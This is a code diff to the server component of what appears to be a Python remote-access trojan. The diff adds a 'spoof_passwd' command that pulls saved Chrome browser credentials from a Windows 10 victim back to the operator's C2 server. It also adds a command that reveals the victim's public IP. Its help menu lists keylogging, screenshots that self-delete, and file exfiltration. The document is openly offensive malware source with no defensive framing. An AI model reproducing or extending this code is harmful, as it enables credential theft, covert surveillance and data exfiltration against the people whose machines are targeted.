@@ -55,7 +55,7 @@ def download_file(file_name):
 	# while loop will break --> indicating file data transfer is
 	# complete.
 
-	print(colored("[+] Taking file... ", 'green'))
+	print(colored("[+] Taking/receiving file... ", 'green'))
 
 	data_small = trgt.recv(1024)
 
@@ -184,13 +184,19 @@ take <file> (linux/windows)   :    To exfiltrate file from trgt
 
 drop <file> (linux/windows)   :    To infiltrate file from C2 server to trgt
 
-screenshot OR   ss            :    To take screenshot and self destructs the screenshot from trgt
+screenshot OR  ss             :    To take screenshot and self destructs the screenshot from trgt
 
 keylog_on                     :    To start keylogger
 
 keylog_dump                   :    To print keystrokes
 
 keylog_off                    :    To close keylogger and self destruct the logged file
+
+spoof_passwd                  :    To spoof password as a file from trgt machine (windows 10, Chrome browser Version 89.0.4389.90 (Official Build) (64-bit)) and sents to C2Server
+(windows only)
+
+spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
+
 ''', 'green'))
 			print(colored('You can also use other commands related to networking, etc for linux as well as windows','yellow'))
 			print(colored('''------------------------------------------------------------------------------------------''','green'))
@@ -239,6 +245,14 @@ keylog_off                    :    To close keylogger and self destruct the logg
 		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):
 
 			continue 			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+
+
+		# Password Spoofing from trgt win10 Chrome browser
+		elif cmd[:12] == "spoof_passwd" and len(cmd) > 1:
+
+			download_file("chrome_creds.txt")
+
+			trgt.settimeout(5)
 
 		# Screenshot    ✓
 
